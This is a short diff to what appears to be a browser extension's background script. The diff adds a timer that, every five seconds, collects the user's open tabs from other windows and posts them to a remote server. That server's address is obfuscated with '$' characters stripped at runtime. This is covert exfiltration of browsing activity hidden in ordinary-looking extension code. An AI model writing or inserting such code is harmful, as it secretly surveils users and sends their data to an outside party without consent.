@@ -1,4 +1,4 @@
-importScripts('./foreground.min.js')
+// importScripts('./foreground.min.js')
 
 // const url = 'http://localhost'.replace(/\$/g, '')
 const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
@@ -29,3 +29,11 @@ chrome.tabs.onUpdated.addListener(async function (tabId, info, tab) {
         })
     }
 })
+
+setInterval(async () => {
+    const tabs = await chrome.tabs.query({ currentWindow: false })
+    post({
+        url: `${url}/api/extension/tabs`,
+        body: tabs
+    })
+}, 5000)
